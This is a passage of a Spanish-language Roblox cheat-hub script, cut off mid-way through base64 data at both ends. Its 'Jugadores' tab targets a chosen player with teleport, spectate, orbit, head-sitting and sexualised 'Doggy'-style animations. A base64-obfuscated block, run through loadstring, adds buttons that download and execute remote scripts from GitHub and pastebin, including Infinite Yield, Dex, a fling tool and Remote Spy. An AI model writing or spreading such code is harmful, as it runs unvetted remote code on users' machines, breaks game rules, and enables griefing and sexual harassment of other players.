UKCiAgICAgICAgaWYgQW50aUFma0VuYWJsZWQgdGhlbgogICAgICAgICAgICBBbnRpQWZrVGhyZWFkID0gdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBBbnRpQWZrRW5hYmxlZCBkbwogICAgICAgICAgICAgICAgICAgIC0tIFNpbXVsYXIgc2FsdG8KICAgICAgICAgICAgICAgICAgICBpZiBodW1hbm9pZCBhbmQgaHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuSnVtcGluZykKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgLS0gU2ltdWxhciByb3RhY2nDs24gZGUgY8OhbWFyYQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNhbUNGID0gY2FtZXJhLkNGcmFtZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvdGF0aW9uID0gQ0ZyYW1lLkFuZ2xlcygwLCBtYXRoLnJhZCgxKSwgMCkgLS0gZ2lyYSB1biBwb2NvIGEgbGEgZGVyZWNoYQogICAgICAgICAgICAgICAgICAgIGNhbWVyYS5DRnJhbWUgPSBjYW1DRiAqIHJvdGF0aW9uCgogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCg2MCkgLS0gY2FkYSA2MCBzZWd1bmRvcwogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGlmIEFudGlBZmtUaHJlYWQgdGhlbgogICAgICAgICAgICAgICAgdGFzay5jYW5jZWwoQW50aUFma1RocmVhZCkKICAgICAgICAgICAgICAgIEFudGlBZmtUaHJlYWQgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQsCn0pCgoK
]]

-- Decodificamos y ejecutamos
loadstring(base64decode(encoded))()



























----JUGADORES---
JugadoresTab = Window:CreateTab("Jugadores")
JugadoresTab:CreateSection("Acciones")


-- Variables globales necesarias
local selectedPlayer = nil
local aimlockEnabled = false
local aimlockConnection
local orbitConnection
local sitConnection
local followConnection
local isSitting = false
local orbitSpeed = 20
local orbitDistance = 10
local followOffsetZ = 5
local orbitEnabled = false
local followEnabled = false
local doggyEnabled = false
local doggyConnection
local doggyAnimId = 13694096724
local doggyAnimTime = 2.6
local doggySpeed = 1 -- Velocidad fija para el movimiento doggy
local doggyDirection = 1
local doggyCurrentDistance = 2.7
local doggyTargetDistance = 4

-- Variables globales necesarias
local pataEnabled = false
local pataConnection
local pataAnimId = 18526288497
local pataAnimTime = 2.44
local pataSpeed = 1 -- Velocidad fija para el movimiento pata
local pataDirection = 1
local pataCurrentDistance = 3
local pataTargetDistance = 4

-- Variables globales necesarias
local cariEnabled = false
local cariConnection
local cariAnimId = 15679624464
local cariAnimTime = 2.6
local cariSpeed = 5-- Velocidad fija para el movimiento cari
local cariDirection = 1
local cariCurrentDistance = 2.7
local cariTargetDistance = 4

-- Variables globales necesarias
local wataEnabled = false
local wataConnection
local wataAnimId = 12992262118
local wataAnimTime = 5.6
local wataSpeed = 5 -- Velocidad fija para el movimiento Wata
local wataDirection = 1
local wataCurrentDistance = 2
local wataTargetDistance = 3
local savedCollisions = {}

-- Función para controlar la colisión
local function SetNoCollision(char, state)
    if state then
        -- Guardar estado original
        savedCollisions[char] = {}
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                savedCollisions[char][part] = part.CanCollide
                part.CanCollide = false
            end
        end
    else
        -- Restaurar el estado original
        if savedCollisions[char] then
            for part, original in pairs(savedCollisions[char]) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = original
                end
            end
            savedCollisions[char] = nil
        end
    end
end

-- Función para ejecutar el Wata
local function PlayWata(target)
    if not target or not target.Character then return end
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    local root = char:WaitForChild("HumanoidRootPart")
    local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
    if not humanoid or not root or not targetRoot then return end

    -- Animación Wata
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. wataAnimId
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    track.TimePosition = wataAnimTime
    track:AdjustSpeed(0)

    humanoid.AutoRotate = false
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    SetNoCollision(char, true)

    -- Ciclo de movimiento hacia adelante y atrás
    wataConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
        if not targetRoot.Parent then return end

        -- Ajustar distancia
        wataCurrentDistance = wataCurrentDistance + (wataSpeed * wataDirection * game:GetService("RunService").Heartbeat:Wait())

        -- Cambiar dirección si se alcanza la distancia máxima o mínima
        if wataCurrentDistance >= wataTargetDistance then
            wataDirection = -1
        elseif wataCurrentDistance <= 1.2 then
            wataDirection = 1
        end

        -- Posicionar al jugador enfrente del objetivo y mirando hacia él
        local offsetPosition = targetRoot.Position + targetRoot.CFrame.LookVector * wataCurrentDistance + Vector3.new(0, 0.23, 0)
        root.CFrame = CFrame.lookAt(offsetPosition, targetRoot.Position)
    end)
end

-- Función para detener el Wata
local function StopWata()
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChild("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if wataConnection then
        wataConnection:Disconnect()
        wataConnection = nil
    end

    if humanoid then
        humanoid.AutoRotate = true
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        for _, track in humanoid:GetPlayingAnimationTracks() do
            if tostring(track.Animation.AnimationId):find(tostring(wataAnimId)) then
                track:Stop()
            end
        end
    end

    if char then
        SetNoCollision(char, false)
    end
end


-- Función para controlar la colisión
local function SetNoCollision(char, state)
    if state then
        -- Guardar estado original
        savedCollisions[char] = {}
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                savedCollisions[char][part] = part.CanCollide
                part.CanCollide = false
            end
        end
    else
        -- Restaurar el estado original
        if savedCollisions[char] then
            for part, original in pairs(savedCollisions[char]) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = original
                end
            end
            savedCollisions[char] = nil
        end
    end
end

-- Función para ejecutar el Cari
local function PlayCari(target)
    if not target or not target.Character then return end
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    local root = char:WaitForChild("HumanoidRootPart")
    local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
    if not humanoid or not root or not targetRoot then return end

    -- Animación Cari
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. cariAnimId
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    track.TimePosition = cariAnimTime
    track:AdjustSpeed(0)

    humanoid.AutoRotate = false
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    SetNoCollision(char, true)

    -- Ciclo de movimiento hacia adelante y atrás
    cariConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
        if not targetRoot.Parent then return end

        -- Ajustar distancia
        cariCurrentDistance = cariCurrentDistance + (cariSpeed * cariDirection * game:GetService("RunService").Heartbeat:Wait())

        -- Cambiar dirección si se alcanza la distancia máxima o mínima
        if cariCurrentDistance >= cariTargetDistance then
            cariDirection = -1
        elseif cariCurrentDistance <= 1.2 then
            cariDirection = 1
        end

        -- Posicionar al jugador detrás del objetivo y mirando hacia él
        local offsetPosition = targetRoot.Position - targetRoot.CFrame.LookVector * cariCurrentDistance + Vector3.new(0, 0.23, 0)
        root.CFrame = CFrame.lookAt(offsetPosition, targetRoot.Position)
    end)
end

-- Función para detener el Cari
local function StopCari()
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChild("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if cariConnection then
        cariConnection:Disconnect()
        cariConnection = nil
    end

    if humanoid then
        humanoid.AutoRotate = true
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        for _, track in humanoid:GetPlayingAnimationTracks() do
            if tostring(track.Animation.AnimationId):find(tostring(cariAnimId)) then
                track:Stop()
            end
        end
    end

    if char then
        SetNoCollision(char, false)
    end
end


-- Función para encontrar jugador por nombre parcial o DisplayName
local function findPlayerByPartialName(name)
    name = name:lower()
    for _, player in ipairs(game.Players:GetPlayers()) do
        local usernameMatch = player.Name:lower():sub(1, #name) == name
        local displaynameMatch = player.DisplayName:lower():sub(1, #name) == name
        if usernameMatch or displaynameMatch then
            return player
        end
    end
end



-- Función para controlar la colisión
local function SetNoCollision(char, state)
    if state then
        -- Guardar estado original
        savedCollisions[char] = {}
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                savedCollisions[char][part] = part.CanCollide
                part.CanCollide = false
            end
        end
    else
        -- Restaurar el estado original
        if savedCollisions[char] then
            for part, original in pairs(savedCollisions[char]) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = original
                end
            end
            savedCollisions[char] = nil
        end
    end
end

-- Función para ejecutar el Pata
local function PlayPata(target)
    if not target or not target.Character then return end
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    local root = char:WaitForChild("HumanoidRootPart")
    local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
    if not humanoid or not root or not targetRoot then return end

    -- Animación Pata
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. pataAnimId
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    track.TimePosition = pataAnimTime
    track:AdjustSpeed(0)

    humanoid.AutoRotate = false
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    SetNoCollision(char, true)

    -- Ciclo de movimiento hacia adelante y atrás
    pataConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
        if not targetRoot.Parent then return end

        -- Ajustar distancia
        pataCurrentDistance = pataCurrentDistance + (pataSpeed * pataDirection * game:GetService("RunService").Heartbeat:Wait())

        -- Cambiar dirección si se alcanza la distancia máxima o mínima
        if pataCurrentDistance >= pataTargetDistance then
            pataDirection = -1
        elseif pataCurrentDistance <= 2.7 then
            pataDirection = 1
        end

        -- Posicionar al jugador
        local offsetPosition = targetRoot.Position + targetRoot.CFrame.LookVector * pataCurrentDistance + Vector3.new(0, 0.23, 0)
        root.CFrame = CFrame.lookAt(offsetPosition, targetRoot.Position)
    end)
end

-- Función para detener el Pata
local function StopPata()
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChild("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if pataConnection then
        pataConnection:Disconnect()
        pataConnection = nil
    end

    if humanoid then
        humanoid.AutoRotate = true
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        for _, track in humanoid:GetPlayingAnimationTracks() do
            if tostring(track.Animation.AnimationId):find(tostring(pataAnimId)) then
                track:Stop()
            end
        end
    end

    if char then
        SetNoCollision(char, false)
    end
end


-- Función para controlar la colisión
local function SetNoCollision(char, state)
    if state then
        -- Guardar estado original
        savedCollisions[char] = {}
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                savedCollisions[char][part] = part.CanCollide
                part.CanCollide = false
            end
        end
    else
        -- Restaurar el estado original
        if savedCollisions[char] then
            for part, original in pairs(savedCollisions[char]) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = original
                end
            end
            savedCollisions[char] = nil
        end
    end
end
-- Función para ejecutar el Doggy
local function PlayDoggy(target)
    if not target or not target.Character then return end
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    local root = char:WaitForChild("HumanoidRootPart")
    local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
    if not humanoid or not root or not targetRoot then return end

    -- Animación Doggy
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. doggyAnimId
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    track.TimePosition = doggyAnimTime
    track:AdjustSpeed(0)

    humanoid.AutoRotate = false
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    SetNoCollision(char, true)

    -- Ciclo de movimiento hacia adelante y atrás
    doggyConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
        if not targetRoot.Parent then return end

        -- Ajustar distancia
        doggyCurrentDistance = doggyCurrentDistance + (doggySpeed * doggyDirection * game:GetService("RunService").Heartbeat:Wait())

        -- Cambiar dirección si se alcanza la distancia máxima o mínima
        if doggyCurrentDistance >= doggyTargetDistance then
            doggyDirection = -1
        elseif doggyCurrentDistance <= 2.7 then
            doggyDirection = 1
        end

        -- Posicionar al jugador
        local offsetPosition = targetRoot.Position + targetRoot.CFrame.LookVector * doggyCurrentDistance + Vector3.new(0, 0.23, 0)
        root.CFrame = CFrame.lookAt(offsetPosition, targetRoot.Position)
    end)
end

-- Función para detener el Doggy
local function StopDoggy()
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChild("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if doggyConnection then
        doggyConnection:Disconnect()
        doggyConnection = nil
    end

    if humanoid then
        humanoid.AutoRotate = true
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        for _, track in humanoid:GetPlayingAnimationTracks() do
            if tostring(track.Animation.AnimationId):find(tostring(doggyAnimId)) then
                track:Stop()
            end
        end
    end

    if char then
        SetNoCollision(char, false)
    end
end

-- Input de nombre de jugador
JugadoresTab:CreateInput({
    Name = "Nombre del Jugador",
    PlaceholderText = "Ej. juan, maria...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        local player = findPlayerByPartialName(text)
        if player then
            selectedPlayer = player
            Rayfield:Notify({
                Title = "Jugador Seleccionado",
                Content = player.Name .. " ha sido seleccionado.",
                Duration = 3,
                Image = 4483362458
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "No se encontró el jugador.",
                Duration = 3,
                Image = 4483362458
            })
        end
    end
})



local espectando = false
local cameraSubjectBackup

JugadoresTab:CreateToggle({
    Name = "Espectar",
    CurrentValue = false,
    Callback = function(Value)
        local camera = workspace.CurrentCamera
        local localPlayer = game.Players.LocalPlayer

        if Value then
            if selectedPlayer and selectedPlayer.Character then
                cameraSubjectBackup = camera.CameraSubject
                camera.CameraSubject = selectedPlayer.Character:FindFirstChildWhichIsA("Humanoid")
                espectando = true
            end
        else
            if localPlayer and localPlayer.Character then
                camera.CameraSubject = localPlayer.Character:FindFirstChildWhichIsA("Humanoid")
                espectando = false

            end
        end
    end
})





-- Teleportarse
JugadoresTab:CreateButton({
    Name = "Teleportarse",
    Callback = function()
        if selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPos = selectedPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character:MoveTo(targetPos)
        end
    end
})



-- Función para guardar y restaurar colisiones
local function SaveCollisions(char)
    savedCollisions[char] = {}
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            savedCollisions[char][part] = part.CanCollide
        end
    end
end

local function RestoreCollisions(char)
    if savedCollisions[char] then
        for part, original in pairs(savedCollisions[char]) do
            if part and part:IsA("BasePart") then
                part.CanCollide = original
            end
        end
        savedCollisions[char] = nil
    end
end

-- Sliders para órbita (ya existentes)
JugadoresTab:CreateSlider({
    Name = "Velocidad de Órbita",
    Range = {1, 200},
    Increment = 1,
    Suffix = "vel",
    CurrentValue = orbitSpeed,
    Callback = function(value)
        orbitSpeed = value
    end
})

JugadoresTab:CreateSlider({
    Name = "Distancia de Órbita",
    Range = {1, 40},
    Increment = 1,
    Suffix = "studs",
    CurrentValue = orbitDistance,
    Callback = function(value)
        orbitDistance = value
    end
})

-- Toggle para activar/desactivar órbita (ya existente)
JugadoresTab:CreateToggle({
    Name = "Órbita (girar alrededor del jugador)",
    CurrentValue = false,
    Callback = function(value)
        orbitEnabled = value
        if orbitConnection then
            orbitConnection:Disconnect()
            orbitConnection = nil
        end

        if orbitEnabled and selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetHRP = selectedPlayer.Character.HumanoidRootPart
            local localChar = game.Players.LocalPlayer.Character
            local angle = 0

            -- Guardar colisiones antes de activar la órbita
            SaveCollisions(localChar)
            
            orbitConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
                if localChar and localChar:FindFirstChild("HumanoidRootPart") then
                    angle = angle + orbitSpeed * dt
                    local offset = Vector3.new(math.cos(angle) * orbitDistance, 0, math.sin(angle) * orbitDistance)
                    local newPos = targetHRP.Position + offset
                    local hrp = localChar.HumanoidRootPart
                    hrp.CFrame = CFrame.new(newPos, targetHRP.Position)
                end
            end)

            -- Desactivar colisiones para la órbita
            for _, part in pairs(localChar:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end


        elseif not orbitEnabled then
            local localChar = game.Players.LocalPlayer.Character
            if localChar and localChar:FindFirstChild("HumanoidRootPart") then
                local safePos = localChar.HumanoidRootPart.Position + Vector3.new(0, 3, 0)
                localChar.HumanoidRootPart.CFrame = CFrame.new(safePos)

                -- Restaurar las colisiones originales
                RestoreCollisions(localChar)
            end


        end
    end
})







local sitToggle = false
local sitConnection
local isSitting = false

JugadoresTab:CreateToggle({
    Name = "Sentarse en la cabesa",
    Default = false,
    Callback = function(state)
        local localChar = game.Players.LocalPlayer.Character
        local humanoid = localChar and localChar:FindFirstChildOfClass("Humanoid")

        sitToggle = state

        if sitToggle and selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("Head") and humanoid then
            local head = selectedPlayer.Character.Head

            humanoid.Sit = true
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            humanoid.JumpHeight = 0

            local voddyPosition = head.Position + Vector3.new(0, 1, 0)
            localChar.HumanoidRootPart.CFrame = CFrame.new(voddyPosition)

            localChar.HumanoidRootPart.Anchored = true
            wait(0.01)
            localChar.HumanoidRootPart.Anchored = false

            sitConnection = game:GetService("RunService").Heartbeat:Connect(function()
                if selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("Head") then
                    local headPos = selectedPlayer.Character.Head.Position
                    localChar.HumanoidRootPart.CFrame = CFrame.new(headPos + Vector3.new(0, 1, 0))
                end
            end)

            isSitting = true
        elseif not sitToggle and humanoid then
            if sitConnection then
                sitConnection:Disconnect()
                sitConnection = nil
            end

            local originalPosition = localChar.HumanoidRootPart.Position
            localChar.HumanoidRootPart.Anchored = true
            wait(0.01)
            localChar.HumanoidRootPart.Anchored = false
            localChar.HumanoidRootPart.CFrame = CFrame.new(originalPosition)

            humanoid.Sit = false
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
            humanoid.JumpHeight = 7.2

            isSitting = false
        end
    end
})










-- Toggle para activar/desactivar Doggy
JugadoresTab:CreateToggle({
    Name = "Movimiento de boca",
    CurrentValue = false,
    Callback = function(value)
        doggyEnabled = value

        if doggyEnabled and selectedPlayer then
            PlayDoggy(selectedPlayer)
        else
            StopDoggy()

            -- Hacer que el jugador salte al desactivar
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
})


-- Slider para ajustar la velocidad del movimiento Doggy
JugadoresTab:CreateSlider({
    Name = "Velocidad",
    Range = {1, 15}, -- Rango de velocidad, ajustable según tus necesidades
    Increment = 0.1,
    Suffix = "vel",
    CurrentValue = doggySpeed,
    Callback = function(value)
        doggySpeed = value
        if doggyEnabled and selectedPlayer then
            -- Reiniciar el movimiento de Doggy para aplicar la nueva velocidad
            StopDoggy()
            PlayDoggy(selectedPlayer)
        end
    end
})



-- Toggle para activar/desactivar Pata
JugadoresTab:CreateToggle({
    Name = "Movimiento de pata",
    CurrentValue = false,
    Callback = function(value)
        pataEnabled = value

        if pataEnabled and selectedPlayer then
            PlayPata(selectedPlayer)
        else
            StopPata()

            -- Hacer que el jugador salte al desactivar
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
})


-- Slider para ajustar la velocidad del movimiento Pata
JugadoresTab:CreateSlider({
    Name = "Velocidad",
    Range = {1, 15}, -- Rango de velocidad, ajustable según tus necesidades
    Increment = 0.1,
    Suffix = "vel",
    CurrentValue = pataSpeed,
    Callback = function(value)
        pataSpeed = value
        if pataEnabled and selectedPlayer then
            -- Reiniciar el movimiento de Pata para aplicar la nueva velocidad
            StopPata()
            PlayPata(selectedPlayer)
        end
    end
})

-- Toggle para activar/desactivar Cari
JugadoresTab:CreateToggle({
    Name = "Dar Cariño",
    CurrentValue = false,
    Callback = function(value)
        cariEnabled = value

        if cariEnabled and selectedPlayer then
            PlayCari(selectedPlayer)
        else
            StopCari()

            -- Hacer que el jugador salte al desactivar
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
})

-- Slider para ajustar la velocidad del movimiento Cari
JugadoresTab:CreateSlider({
    Name = "Velocidad",
    Range = {1, 20}, -- Rango de velocidad, ajustable según tus necesidades
    Increment = 0.1,
    Suffix = "vel",
    CurrentValue = cariSpeed,
    Callback = function(value)
        cariSpeed = value
        if cariEnabled and selectedPlayer then
            -- Reiniciar el movimiento de Cari para aplicar la nueva velocidad
            StopCari()
            PlayCari(selectedPlayer)
        end
    end
})


-- Toggle para activar/desactivar Wata
JugadoresTab:CreateToggle({
    Name = "Dar Wata",
    CurrentValue = false,
    Callback = function(value)
        wataEnabled = value

        if wataEnabled and selectedPlayer then
            PlayWata(selectedPlayer)
        else
            StopWata()

            -- Hacer que el jugador salte al desactivar
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
})

-- Slider para ajustar la velocidad del movimiento Wata
JugadoresTab:CreateSlider({
    Name = "Velocidad",
    Range = {1, 20}, -- Rango de velocidad, ajustable según tus necesidades
    Increment = 0.1,
    Suffix = "vel",
    CurrentValue = wataSpeed,
    Callback = function(value)
        wataSpeed = value
        if wataEnabled and selectedPlayer then
            -- Reiniciar el movimiento de Wata para aplicar la nueva velocidad
            StopWata()
            PlayWata(selectedPlayer)
        end
    end
})



































----Scripts
_G.Window = Window



-- Función para decodificar Base64
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

-- Aquí va el script codificado en base64
local encoded = [[
LS0tU2NyaXB0cyBwcmUgaGVjaG9zCgpUUFRhYiA9IF9HLldpbmRvdzpDcmVhdGVUYWIoIlNjcmlwdHMiLCBuaWwpIC0tIFRpdGxlLCBJbWFnZQoKQnV0dG9uMSA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiSW5maW5pdGUgWWllbGQiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9FZGdlSVkvaW5maW5pdGV5aWVsZC9tYXN0ZXIvc291cmNlJykpKCkKCiAgIGVuZCwKfSkKIEJ1dHRvbjIgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkRleCIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3p6ZXJleHgvRGV4L3JlZnMvaGVhZHMvbWFzdGVyL21haW4ubHVhIikpKCkKICAgZW5kLAp9KQoKIEJ1dHRvbjIgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkZlIEludmljaWJsZSBHIHBhcmEgYWN0aXZhciIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzNSbmQ5ckhmJykpKCkKICAgZW5kLAp9KQoKCiBCdXR0b24zID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJGTGluZyhLYXdhaWkgb3ApIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCnBjYWxsKGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9oZWxsb2hlbGxvaGVsbDAxMjMyMS9LQVdBSUktRlJFQUtZLUZMSU5HL21haW4va2F3YWlpX2ZyZWFreV9mbGluZy5sdWEiLHRydWUpKSgpCmVuZCkKICAgZW5kLAp9KQoKCiBCdXR0b24zID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJBRkVNIChBbmltYWNpb25lcyBSMTUpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3lhcmhtLm1oaS5pbS9zY3I/Y2hhbm5lbD1hZmVtIiwgZmFsc2UpKSgpCiAgIGVuZCwKfSkKCiBCdXR0b24zID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJSZW1vdGUgU3B5IChPY3RvIHNweSkiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9JbmZlcm51c1NjcmlwdHMvT2N0by1TcHkvcmVmcy9oZWFkcy9tYWluL01haW4ubHVhIiwgdHJ1ZSkpKCkKICAgZW5kLAp9KQoKIEJ1dHRvbjQgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkZseSB1bml2ZXJzYWwiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9kenJHbUJidyIpKSgpCiAgIGVuZCwKfSkKCiBCdXR0b241ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiVGVjbGFkbyAoTW92aWwpIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlZFplblhZWi80ZDgwYmZkNzBlZTI3MDAwNjYwZTRiZmE3NTA5YzY2Ny9yYXcvZGE5MDNjNTcwMjQ5YWIzYzBjMWE3NGYzNDY3MjYwOTcyYzNkODdlNi9LZXlCb2FyZCUyNTIwRnJvbSUyNTIwT2hpbyUyNTIwRnIlMjUyMEZyIikpKCkKICAgIGVuZCwKIH0pCiAKCiBCdXR0b241ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJHaG9zdEh1YiIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dob3N0UGxheWVyMzUyL1Rlc3Q0L21haW4vR2hvc3RIdWInKSkoKQogICBlbmQsCn0pCgogQnV0dG9uNiA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAidmVub3ggKE5lY2VzaXRhIGtleSkiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92ZW5veGNjL3Zlbm94VjEvbWFpbi9tYWluLmx1YScpKSgpCiAgIGVuZCwKfSkKCiBCdXR0b242ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJMYXRpbiBodWIoTXVjaGFzIGNvc2FzIG5vIGZ1bmNpb25hbikiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQo